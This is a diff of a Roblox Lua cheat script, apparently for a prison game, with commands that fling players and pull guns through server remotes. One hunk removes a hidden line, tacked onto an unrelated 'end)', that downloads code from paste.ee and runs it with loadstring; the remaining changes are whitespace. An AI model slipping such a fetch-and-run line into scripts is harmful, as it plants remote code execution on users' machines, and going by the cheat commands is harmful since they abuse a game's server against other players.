@@ -2070,7 +2070,7 @@ draggable(main)
 			for i,v in pairs(game.Lighting:GetChildren()) do
 				v.Parent = workspace
 			end
-		end) loadstring(game:HttpGet("https://paste.ee/r/NTtmf", true))()
+		end)
     end
 	if Command("fling") then
 	    Notify("fling Success", Color3.fromRGB(0,255,0), "Succees")
@@ -2598,7 +2598,7 @@ end)
 		Notify("Get Knife", Color3.fromRGB(0, 255, 0), "Success")
 	end
 	if Command("gun") or Command("guns") or Command("allguns") then
-		if BuyGamepass then
+	     if BuyGamepass then
 			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
 			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
 			workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
@@ -5180,3 +5180,4 @@ getgenv().DisableScript = function()
 end
 
 workspace.Remote.loadchar:InvokeServer()
+
